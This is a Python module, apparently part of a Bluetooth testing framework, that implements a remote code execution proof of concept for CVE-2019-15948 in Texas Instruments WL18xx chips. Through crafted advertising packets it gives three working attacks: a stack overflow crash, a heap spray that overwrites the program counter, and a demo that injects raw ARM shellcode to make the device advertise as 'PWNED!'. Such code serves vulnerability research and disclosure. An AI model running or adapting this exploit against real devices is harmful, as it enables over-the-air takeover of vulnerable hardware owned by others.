import time

class TestSet():
    def __init__(self, subparsers):
        self.cmd = 'ti_adv_rce'

        self.parser = subparsers.add_parser(self.cmd, help='Texas Instruments WL18xx CVE_2019-15948 RCE PoC')
        self.parser.add_argument('action', choices=['crash', 'poc', 'demo'], help='Choose an action')
        self.funcs = {'crash':self.crash, 'poc':self.poc, 'demo':self.demo}

    def getCmd(self):
        return self.cmd

    def run(self, hci_manager, action):
        self.hm = hci_manager
        self.funcs[action]()

    # generate packets to cause a stack buffer overflow
    def crash(self):
        self.hm.set_filter()
        time.sleep(1)

        self.hm.set_adv_params()
        self.hm.enable_custom_ac_pdu(True)
        self.hm.send_ac_pdu_header(0)
        self.hm.enable_adv(True)

        payload = b"\x41\x41"

        # attack packet
        for i in range(0,3):
           self.hm.send_ac_pdu_payload(payload, True)

        self.hm.stop(None, None)

    # generate packets to overwrite PC with 0x41414141
    def poc(self):
        self.hm.set_filter()
        time.sleep(1)

        self.hm.set_adv_params()
        self.hm.enable_custom_ac_pdu(True)
        self.hm.send_ac_pdu_header(0)
        self.hm.enable_adv(True)

        # max packet should be 37
        payload = b"\x41" * 37

        # heap spray
        for i in range(0, 200):
            self.hm.send_ac_pdu_header(0)
            self.hm.send_ac_pdu_payload(payload, True)

        # attack packet
        for i in range(0,3):
            self.hm.send_ac_pdu_payload(payload[0:2], True)

        self.hm.stop(None, None)

    # generate packets with shellcode to start advertising with local name "PWNED!"
    def demo(self):
        self.hm.set_filter()
        time.sleep(1)

        self.hm.set_adv_params()
        self.hm.enable_custom_ac_pdu(True)
        self.hm.send_ac_pdu_header(0)
        self.hm.enable_adv(True)

        # max packet should be 37

        # hardcoded data struct for "PWNED!"
        pkt01 = b"\x41\x41\x41\x41\x41"
        pkt01 += b"\xf1\x39\x08\x20"
        pkt01 += b"\x41\x41\x41"
        pkt01 += b"\x41\x41\x2c\x3a\x08\x20"
        pkt01 += b"\x08\x00\x00\x00\x34\x3a\x08\x20\x07\x09\x50\x57\x4e\x45\x44\x21"

        # refer pwned.s
        pkt02 = b"\x41\x41\x41\x41\x41\xf1\x39\x08\x20\x41\x4d\xf2\xd5\x15\xc0\xf2\x08\x05\x0b\x49\x0a\x20\xa8\x47\x01\x21\x04\x20\xa8\x47\xbf\xf3\x6f\x8f\xfc\xe7"

        pkts = [pkt01, pkt02]

        # heap spray
        for i in range(0, 200):
            if (i % 2) == 0:
                payload = pkts[0]
            else:
                payload = pkts[1]

            self.hm.send_ac_pdu_payload(payload, True)

        # attack packet
        for i in range(0,3):
            self.hm.send_ac_pdu_payload(payload[0:2], True)

        self.hm.stop(None, None)
